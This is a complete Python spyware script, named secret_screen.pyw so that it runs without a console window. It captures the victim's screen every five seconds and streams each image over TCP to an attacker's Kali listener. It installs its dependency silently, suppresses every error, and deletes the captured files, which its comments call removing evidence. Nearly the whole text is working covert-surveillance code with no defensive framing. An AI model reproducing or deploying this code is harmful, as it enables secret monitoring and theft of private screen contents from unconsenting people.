# File name → secret_screen.pyw   (must save with .pyw extension to hide console window)

import mss
import socket
import time
import os
import datetime

# ------------------ Configuration ------------------
KALI_IP = "YOUR_KALI_IP"           # ←←← Your Kali Linux / listening server IP
PORT = 9999                         # Port where netcat / server is listening
ALSO_SAVE_ON_WINDOWS = False        # Set True only for local testing
CAPTURE_FILENAME = "screen_capture.jpg"

INTERVAL_SECONDS = 5                # ← Change this to control delay between captures
MONITOR_NUMBER = 1                   # 1 = primary monitor, 2 = secondary, etc.
# ---------------------------------------------------

def send_file_to_server(filename, server_ip, server_port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((server_ip, server_port))
        
        with open(filename, "rb") as file_handle:
            sock.sendfile(file_handle)
        
        sock.close()
        return True
        
    except Exception as e:
        return False

# Required package check
try:
    import mss
except ImportError:
    # Silent install (no console output)
    os.system('pip install mss > nul 2>&1')
    import mss

# Endless loop - runs forever in background
while True:
    try:
        with mss.mss() as sct:
            # Monitor define karo
            monitor = sct.monitors[MONITOR_NUMBER]  # 0 = all monitors, 1 = primary
            
            # Screenshot lo
            screenshot = sct.grab(monitor)
            
            # Save as JPEG
            mss.tools.to_png(screenshot.rgb, screenshot.size, output=CAPTURE_FILENAME)
        
        # Optional: save copy to desktop for debugging
        if ALSO_SAVE_ON_WINDOWS:
            desktop_path = os.path.join(os.environ['USERPROFILE'], 'Desktop')
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            save_path = os.path.join(desktop_path, f"screen_{timestamp}.jpg")
            
            # Copy file to desktop
            with open(CAPTURE_FILENAME, 'rb') as src, open(save_path, 'wb') as dst:
                dst.write(src.read())
        
        # Send to your server
        send_file_to_server(CAPTURE_FILENAME, KALI_IP, PORT)
        
        # Delete evidence (optional but recommended)
        try:
            os.remove(CAPTURE_FILENAME)
        except:
            pass

    except Exception as e:
        pass   # stay silent even on errors

    # Wait before next capture
    time.sleep(INTERVAL_SECONDS)